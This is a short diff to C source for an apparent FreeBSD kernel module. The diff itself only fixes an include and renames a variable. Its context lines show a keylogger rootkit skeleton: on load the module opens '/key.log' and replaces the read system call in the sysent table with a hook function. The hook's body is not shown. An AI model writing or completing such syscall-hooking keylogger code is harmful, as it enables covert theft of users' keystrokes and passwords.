@@ -7,10 +7,10 @@
 #include <sys/systm.h>
 #include <sys/syscall.h>
 #include <sys/sysproto.h>
-#include <fcntl.h>
+#include <sys/fcntl.h>
 
 static int (*saved_read)(struct thread* td, void* syscall_args);
-static int log;
+static int activity_log;
 
 static int
 read_hook( struct thread* td, void* syscall_args)
@@ -51,7 +51,7 @@ load(
 	
 	switch(cmd){
 		case MOD_LOAD:
-			log = open("/key.log", O_WRONLY | O_APPEND ); 
+			activity_log = open("/key.log", O_WRONLY | O_APPEND ); 
 			/*Replace read with read_hook*/
 			//Maybe save the old read funciton?
 			saved_read = sysent[SYS_read].sy_call;
